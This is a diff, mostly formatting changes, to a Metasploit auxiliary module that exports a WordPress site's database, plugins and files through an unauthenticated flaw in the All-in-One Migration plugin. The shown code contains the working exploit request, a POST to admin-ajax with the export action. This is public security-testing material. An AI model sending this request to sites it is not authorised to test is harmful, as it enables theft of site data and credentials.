@@ -8,31 +8,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress All-in-One Migration Export',
-      'Description'     => %q{
-        This module allows you to export Wordpress data (such as the database, plugins, themes,
-        uploaded files, etc) via the All-in-One Migration plugin without authentication.
-      },
-      'License'         => MSF_LICENSE,
-      'Author'          =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress All-in-One Migration Export',
+        'Description' => %q{
+          This module allows you to export Wordpress data (such as the database, plugins, themes,
+          uploaded files, etc) via the All-in-One Migration plugin without authentication.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'James Golovich', # Disclosure
-          'rastating'       # Metasploit module
+          'rastating' # Metasploit module
         ],
-      'References'      =>
-        [
+        'References' => [
           ['WPVDB', '7857'],
           ['URL', 'https://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']
         ],
-      'DisclosureDate'  => '2015-03-19'
-    ))
+        'DisclosureDate' => '2015-03-19',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])
-      ])
+      ]
+    )
   end
 
   def check
@@ -43,11 +49,12 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Requesting website export...")
     res = send_request_cgi(
       {
-        'method'    => 'POST',
-        'uri'       => wordpress_url_admin_ajax,
-        'vars_get'  => { 'action' => 'router' },
+        'method' => 'POST',
+        'uri' => wordpress_url_admin_ajax,
+        'vars_get' => { 'action' => 'router' },
         'vars_post' => { 'options[action]' => 'export' }
-      }, datastore['MAXTIME'])
+      }, datastore['MAXTIME']
+    )
 
     unless res
       fail_with(Failure::Unknown, "#{peer} - No response from the target")
